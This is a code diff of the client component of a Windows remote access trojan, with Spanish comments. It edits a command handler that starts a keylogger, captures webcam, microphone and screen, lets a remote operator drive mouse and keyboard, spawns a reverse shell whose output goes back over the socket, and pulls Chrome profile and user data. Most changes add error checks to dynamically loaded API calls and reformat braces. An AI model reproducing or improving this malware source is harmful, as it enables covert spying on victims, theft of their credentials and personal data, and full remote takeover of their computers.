@@ -126,6 +126,9 @@ Cliente::Cliente() {
 void Cliente::TEST() {
     //this->mod_dynamic->LoadNetProcs();
     //this->mod_Scan = new mod_Escaner(this->mod_dynamic->IPHLAPI);
+    this->mod_dynamic->LoadWMProcs();
+    this->mod_AdminVen = new mod_AdminVentanas(this->mod_dynamic->USER32_WM);
+    this->mod_AdminVen->m_ListaVentanas();
     return;
 }
 
@@ -261,10 +264,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             if (this->map_Archivos_Descarga[strIn[0]].ssOutfile.get()->is_open()) {
                 this->map_Archivos_Descarga[strIn[0]].ssOutfile.get()->write(cBytes, iBytesSize);
                 this->map_Archivos_Descarga[strIn[0]].uDescargado += iBytesSize;
-            }else {
+            }
+            else {
                 //_DBG_("[X] El archivo no esta abierto", GetLastError());
             }
-        } else {
+        }
+        else {
             __DBG_("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
         }
         return;
@@ -299,10 +304,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
             if (nuevo_archivo.ssOutfile.get()->is_open()) {
                 this->Agregar_Archivo_Descarga(nuevo_archivo, strIn[2]);
-            }else {
+            }
+            else {
                 _DBG_("[X] No se pudo abrir el archivo", this->mod_dynamic->KERNEL32.pGetLastError());
             }
-        }else {
+        }
+        else {
             __DBG_("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
         }
         return;
@@ -344,19 +351,21 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Lista directorio
     if (iComando == EnumComandos::FM_Dir_Folder) {
         std::string strIn_c = paquete.cBuffer.data();
-        
+
         std::string strPath = "";
         if (strIn_c == "DESCAR-DOWN") {
             strPath = this->ObtenerDown();
             std::string strPathBCDown = strPath;
             this->cChunkSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true, nullptr, EnumComandos::FM_CPATH);
             std::this_thread::sleep_for(std::chrono::milliseconds(10));
-        }else if (strIn_c == "ESCRI-DESK") {
+        }
+        else if (strIn_c == "ESCRI-DESK") {
             strPath = this->ObtenerDesk();
             std::string strPathBCDesk = strPath;
             this->cChunkSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true, nullptr, EnumComandos::FM_CPATH);
             std::this_thread::sleep_for(std::chrono::milliseconds(10));
-        }else {
+        }
+        else {
             strPath = strIn_c;
         }
 
@@ -370,7 +379,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         strCommand.pop_back();
 
         this->cChunkSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true, nullptr, EnumComandos::FM_Dir_Folder);
-        
+
         return;
     }
 
@@ -413,7 +422,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
             if (isOK) {
                 __DBG_("[!] " + strIn[0] + " - ejecutado");
-            }else {
+            }
+            else {
                 __DBG_("[X] Error ejecutando " + strIn[0]);
             }
         }
@@ -492,7 +502,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //#                   KEYLOGGER                       #
     if (iComando == EnumComandos::KL_Iniciar) {
         if (this->mod_Key == nullptr) {
-            this->mod_dynamic->LoadKLProcs();
+            if (!this->mod_dynamic->LoadKLProcs()) {
+                __DBG_("[X] Error iniciando librerias para el keylogger");
+                return;
+            }
             this->mod_Key = new mod_Keylogger(this->mod_dynamic->KERNEL32, this->mod_dynamic->USER32_KL);
             this->mod_Key->Start();
         }
@@ -514,20 +527,19 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::CM_Lista) {
         //Enviar lista de camaras
         if (!this->mod_Cam) {
-            this->mod_dynamic->LoadCamProcs();
+            if (!this->mod_dynamic->LoadCamProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Cam");
+                return;
+            }
             this->mod_Cam = new mod_Camera(
-                this->mod_dynamic->GDIPLUS_RD, 
+                this->mod_dynamic->GDIPLUS_RD,
                 this->mod_dynamic->SHLWAPI,
-                this->mod_dynamic->MFPLAT, 
-                this->mod_dynamic->MF, 
-                this->mod_dynamic->MFAPI, 
-                this->mod_dynamic->MFREADWRITE, 
-                this->mod_dynamic->OLE32, 
+                this->mod_dynamic->MFPLAT,
+                this->mod_dynamic->MF,
+                this->mod_dynamic->MFAPI,
+                this->mod_dynamic->MFREADWRITE,
+                this->mod_dynamic->OLE32,
                 this->mod_dynamic->KERNEL32);
-        }
-        if (!this->mod_Cam->checkMod()) {
-            __DBG_("[X] mod_Cam no se pudo cargar");
-            return;
         }
 
         std::string strPaquete = "";
@@ -544,16 +556,20 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         else {
             strPaquete += "Nica|Nica2 :v";
         }
-        
+
         this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::CM_Lista_Salida);
-        
+
         return;
     }
 
     if (iComando == EnumComandos::CM_Single) {
         u_int iDeviceIndex = atoi(paquete.cBuffer.data());
         if (!this->mod_Cam) {
-            this->mod_dynamic->LoadCamProcs();
+            if (!this->mod_dynamic->LoadCamProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Cam");
+                return;
+            }
+
             this->mod_Cam = new mod_Camera(
                 this->mod_dynamic->GDIPLUS_RD,
                 this->mod_dynamic->SHLWAPI,
@@ -565,11 +581,6 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 this->mod_dynamic->KERNEL32);
         }
 
-        if (!this->mod_Cam->checkMod()) {
-            __DBG_("[X] mod_Cam no se pudo cargar");
-            return;
-        }
-
         this->mod_Cam->ListNameCaptureDevices();
         if (this->mod_Cam->vcCamObjs.size() <= 0) {
             __DBG_("[X] No se obtuvieron camaras");
@@ -579,7 +590,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
 
         HRESULT hr = S_OK;
-        
+
         if (iDeviceIndex > this->mod_Cam->vcCamObjs.size()) {
             iDeviceIndex = 0; //Si el numero enviado desde el sever es mayor setear a 0 como default
         }
@@ -627,11 +638,6 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::CM_Live_Start) {
         u_int iDeviceIndex = atoi(paquete.cBuffer.data());
         if (this->mod_Cam) {
-            if (!this->mod_Cam->checkMod()) {
-                __DBG_("[X] mod_Cam no se pudo cargar");
-                return;
-            }
-
             if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
                 this->mod_Cam->SpawnLive(iDeviceIndex);
             }
@@ -642,10 +648,6 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::CM_Live_Stop) {
         u_int iDeviceIndex = atoi(paquete.cBuffer.data());
         if (this->mod_Cam) {
-            if (!this->mod_Cam->checkMod()) {
-                __DBG_("[X] mod_Cam no se pudo cargar");
-                return;
-            }
             this->mod_Cam->JoinLiveThread(iDeviceIndex);
         }
         return;
@@ -659,7 +661,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Lista de dispositivos de entrada (mic)
     if (iComando == EnumComandos::Mic_Refre_Dispositivos) {
         if (this->mod_Mic == nullptr) {
-            this->mod_dynamic->LoadMicProcs();
+            if (!this->mod_dynamic->LoadMicProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Mic");
+                return;
+            }
             this->mod_Mic = new Mod_Mic(this->mod_dynamic->WINMMMIC);
         }
 
@@ -671,7 +676,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Escuchar mic en tiempo real
     if (iComando == EnumComandos::Mic_Iniciar_Escucha) {
         if (this->mod_Mic == nullptr) {
-            this->mod_dynamic->LoadMicProcs();
+            if (!this->mod_dynamic->LoadMicProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_Mic");
+                return;
+            }
             this->mod_Mic = new Mod_Mic(this->mod_dynamic->WINMMMIC);
         }
         if (!this->mod_Mic->isLiveMic) {
@@ -702,8 +710,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             delete this->reverseSHELL;
             this->reverseSHELL = nullptr;
         }
-        this->reverseSHELL = new ReverseShell(this);
-        this->reverseSHELL->sckSocket = this->sckSocket;
+        this->reverseSHELL = new ReverseShell();
         this->reverseSHELL->SpawnShell(paquete.cBuffer.data());
         return;
     }
@@ -734,11 +741,15 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Lista de pantallas
     if (iComando == EnumComandos::RD_Lista) {
         if (!this->mod_RemoteDesk) {
-            this->mod_dynamic->LoadRDProcs();
+            if (!this->mod_dynamic->LoadRDProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_RemoteDesk");
+                return;
+            }
+
             this->mod_RemoteDesk = new mod_RemoteDesktop(
-                this->mod_dynamic->USER32_RD, 
-                this->mod_dynamic->GDI32_RD, 
-                this->mod_dynamic->GDIPLUS_RD, 
+                this->mod_dynamic->USER32_RD,
+                this->mod_dynamic->GDI32_RD,
+                this->mod_dynamic->GDIPLUS_RD,
                 this->mod_dynamic->OLE32,
                 this->mod_dynamic->KERNEL32);
         }
@@ -752,7 +763,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 strPaquete += std::to_string(m.rectData.resWidth);
                 strPaquete.append(1, CMD_DEL);
                 strPaquete += std::to_string(m.rectData.resHeight);
-                
+
                 strPaquete.append(1, '|');
                 //std::cout << "Nombre " << m.szDevice<<"\n";
                 //std::cout << "Resolucion: " << m.rectData.resWidth << "x" << m.rectData.resHeight << "\n";
@@ -760,17 +771,22 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             }
             strPaquete.pop_back();
             this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::RD_Lista_Salida);
-        }else {
+        }
+        else {
             _DBG_("No se obtuvieron monitores ? ", this->mod_dynamic->KERNEL32.pGetLastError());
         }
         return;
     }
-    
+
     //Single
     if (iComando == EnumComandos::RD_Single) {
         //Enviar solo una captura
         if (!this->mod_RemoteDesk) {
-            this->mod_dynamic->LoadRDProcs();
+            if (!this->mod_dynamic->LoadRDProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_RemoteDesk");
+                return;
+            }
+
             this->mod_RemoteDesk = new mod_RemoteDesktop(
                 this->mod_dynamic->USER32_RD,
                 this->mod_dynamic->GDI32_RD,
@@ -787,7 +803,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
                 this->mod_RemoteDesk->EnviarCaptura(uQuality, iMonitorIndex);
             }
-        }else {
+        }
+        else {
             __DBG_("No se pudo reservar memoria para el modulo de escritorio remoto o ya esta en modo live");
         }
         return;
@@ -796,7 +813,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Iniciar live
     if (iComando == EnumComandos::RD_Start) {
         if (!this->mod_RemoteDesk) {
-            this->mod_dynamic->LoadRDProcs();
+            if (!this->mod_dynamic->LoadRDProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_RemoteDesk");
+                return;
+            }
             this->mod_RemoteDesk = new mod_RemoteDesktop(
                 this->mod_dynamic->USER32_RD,
                 this->mod_dynamic->GDI32_RD,
@@ -833,12 +853,13 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         if (this->mod_RemoteDesk) {
             ULONG uQuality = static_cast<ULONG>(atoi(paquete.cBuffer.data()));
             this->mod_RemoteDesk->m_UpdateQuality(uQuality);
-        }else {
+        }
+        else {
             __DBG_("[RD]No se ha creado el objeto");
         }
         return;
     }
-    
+
     //Mostar/ocultar mouse remoto en buffer de captura
     if (iComando == EnumComandos::RD_Update_Vmouse) {
         if (this->mod_RemoteDesk) {
@@ -856,12 +877,13 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         if (this->mod_RemoteDesk) {
             strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 4);
             if (strIn.size() == 4) {
-                int x             = atoi(strIn[0].c_str());
-                int y             = atoi(strIn[1].c_str());
+                int x = atoi(strIn[0].c_str());
+                int y = atoi(strIn[1].c_str());
                 int monitor_index = atoi(strIn[2].c_str());
-                int mouse_action  = atoi(strIn[3].c_str());
+                int mouse_action = atoi(strIn[3].c_str());
                 this->mod_RemoteDesk->m_RemoteMouse(x, y, monitor_index, mouse_action);
-            }else {
+            }
+            else {
                 __DBG_("[RD] No se pudo parsear el paquete remote_click");
             }
         }
@@ -876,25 +898,34 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         if (this->mod_RemoteDesk) {
             strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
             if (strIn.size() == 2) {
-                int key     = atoi(strIn[0].c_str());
-                
+                int key = atoi(strIn[0].c_str());
+
                 bool isDown = strIn[1][0] == '0' ? true : false;
                 this->mod_RemoteDesk->m_RemoteTeclado(key, isDown);
-            }else {
+            }
+            else {
                 __DBG_("[RD] No se pudo parsear el paquete remote_teclado");
             }
-        }else {
+        }
+        else {
             __DBG_("[RD]No se ha creado el objeto");
         }
         return;
     }
+
+
+    // MODIFICAR DESDE AQUI LA COMPROBACION DE MODULOS CARGADOS
 
     //#####################################################
     //#####################################################
     //                ADMIN VENTANAS                      # 
     if (iComando == EnumComandos::WM_Lista) {
         if (!this->mod_AdminVen) {
-            this->mod_dynamic->LoadWMProcs();
+            if (!this->mod_dynamic->LoadWMProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_AdminVen");
+                return;
+            }
+
             this->mod_AdminVen = new mod_AdminVentanas(this->mod_dynamic->USER32_WM);
         }
         //Enviar lista parseada de ventanas
@@ -912,19 +943,24 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
     if (iComando == EnumComandos::WM_CMD) {
         if (!this->mod_AdminVen) {
-            this->mod_dynamic->LoadWMProcs();
-            this->mod_AdminVen = new mod_AdminVentanas(this->mod_dynamic->USER32_WM);
-        }
+            if (!this->mod_dynamic->LoadWMProcs()) {
+                __DBG_("[X] Error iniciando librerias para mod_AdminVen");
+                return;
 
-        strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
-        if (strIn.size() == 2) {
-            int iCMD = atoi(strIn[1].c_str());
-            this->mod_AdminVen->m_WindowMSG(strIn[0], iCMD);
-        }else {
-            __DBG_("[RD] No se pudo parsear el paquete admin_ventanas");
+                this->mod_AdminVen = new mod_AdminVentanas(this->mod_dynamic->USER32_WM);
+            }
+
+            strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
+            if (strIn.size() == 2) {
+                int iCMD = atoi(strIn[1].c_str());
+                this->mod_AdminVen->m_WindowMSG(strIn[0], iCMD);
+            }
+            else {
+                __DBG_("[RD] No se pudo parsear el paquete admin_ventanas");
+            }
+
+            return;
         }
-        
-        return;
     }
 
     //#####################################################
@@ -974,7 +1010,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             std::string strPaquete = this->mod_Inf0->m_GetProfileData(strIn[0], strIn[1][0]);
             if (strPaquete.size() > 2) {
                 this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::INF_Chrome_Profile_Data_Out);
-            }else {
+            }
+            else {
                 this->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::INF_Error);
                 __DBG_("No se pudo obtener informacion del perfil");
             }
@@ -991,7 +1028,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         std::string strPaquete = this->mod_Inf0->m_GetUsersData();
         if (strPaquete.size() > 6) {
             this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::INF_Users);
-        }else {
+        }
+        else {
             this->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::INF_Error);
         }
         return;
@@ -1065,7 +1103,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
-    
+
     //#####################################################
     //#####################################################
     //               BROMAS                               # 
@@ -1105,22 +1143,23 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
             this->mod_Fun->m_Msg(msg, title, type);
         }
-        
+
         return;
     }
 
     //Mod fun - cd
     if (iComando == EnumComandos::Fun_CD) {
-        if (this->mod_Fun == nullptr) {
-            this->mod_dynamic->LoadFunProcs();
-            this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
+            if (this->mod_Fun == nullptr) {
+                this->mod_dynamic->LoadFunProcs();
+                this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
+            }
+            BOOL _open = atoi(paquete.cBuffer.data());
+            this->mod_Fun->m_CD(_open);
+            return;
         }
-        BOOL _open = atoi(paquete.cBuffer.data());
-        this->mod_Fun->m_CD(_open);
-        return;
-    }
 
 }
+
 
 void Cliente::Procesar_Paquete(const Paquete& paquete) {
     std::vector<char>& acumulador = this->paquetes_Acumulados[paquete.uiTipoPaquete];
@@ -1617,8 +1656,9 @@ std::string Cliente::ObtenerDown() {
 
 //Reverse shell
 bool ReverseShell::SpawnShell(const char* pstrComando) {
-    if (!cCliente->mod_dynamic->KERNEL32.pGetStartupInfoA || cCliente->mod_dynamic->KERNEL32.pCreateProcessA) {
+    if (!cCliente->mod_dynamic->KERNEL32.pGetStartupInfoA || !cCliente->mod_dynamic->KERNEL32.pCreateProcessA || !cCliente->mod_dynamic->KERNEL32.pCreatePipe) {
         __DBG_("[X]SpawnShell no se cargaron las funciones");
+        return false;
     }
     __DBG_("Lanzando " + std::string(pstrComando));
 
@@ -1744,7 +1784,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
                 }
                 cBuffer2[dBytesToWrite] = '\0';
 
-                int iEnviado = cCliente->cChunkSend(this->sckSocket, cBuffer2, dBytesToWrite, 0, true, nullptr, EnumComandos::Reverse_Shell_Salida);
+                int iEnviado = cCliente->cChunkSend(cCliente->sckSocket, cBuffer2, dBytesToWrite, 0, true, nullptr, EnumComandos::Reverse_Shell_Salida);
                 std::this_thread::sleep_for(std::chrono::milliseconds(10));
                 if (iEnviado <= 0) {
                     //Desconectado o se perdio la conexion
